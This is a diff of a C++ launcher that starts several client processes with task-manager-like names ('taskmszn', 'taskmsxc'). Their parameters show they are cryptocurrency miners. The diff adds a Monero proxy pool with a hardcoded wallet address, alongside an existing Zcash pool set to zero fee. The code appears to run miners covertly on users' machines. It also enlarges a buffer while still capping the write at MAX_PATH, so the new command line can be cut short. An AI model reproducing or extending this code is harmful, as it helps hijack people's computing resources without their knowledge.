@@ -241,7 +241,7 @@ bool RunEnvironment::StartAllClient(bool bFirst)
 			TSDEBUG4CXX(L"client " << *c_iter <<L" is running");
 			continue;
 		}
-		wchar_t szParam[MAX_PATH] = {0};
+		wchar_t szParam[1024] = {0};
 		if (*c_iter == L"taskmszn")
 		{
 			_snwprintf(szParam, MAX_PATH, L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec --intensity 1", ACCOUNT,m_wstrWorkIDZ.c_str());
@@ -252,7 +252,8 @@ bool RunEnvironment::StartAllClient(bool bFirst)
 		}
 		else if (*c_iter == L"taskmsxc")
 		{
-			_snwprintf(szParam, MAX_PATH, L"-p %s -t %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
+			//_snwprintf(szParam, MAX_PATH, L"-p %s -t %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
+			_snwprintf(szParam, MAX_PATH, L"--url sm3xmrproxy.share4money.cn:3335 --user 47knn7zNdNNiGxs211vzTRUEQ3w5fhRsWWWL9UYdWaJPCbbDfobbvvhFZPNAzHBtuh2CJNVr8DtE37WiyJ4hnkEYGThvZtP --pass x --rig-id %s --threads %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
 		}
 		else if (*c_iter == L"taskmse")
 		{
@@ -271,8 +272,8 @@ bool RunEnvironment::StartAllClient(bool bFirst)
 		{
 			continue;
 		}
-		WCHAR szCmdLine[MAX_PATH] = {0};
-		_snwprintf(szCmdLine, _MAX_PATH, L"%s %s", wstrClientPath.c_str(), szParam);
+		WCHAR szCmdLine[1024] = {0};
+		_snwprintf(szCmdLine, 1024, L"%s %s", wstrClientPath.c_str(), szParam);
 		if (CreateClientProcess(szCmdLine))
 		{
 			bRet = true;
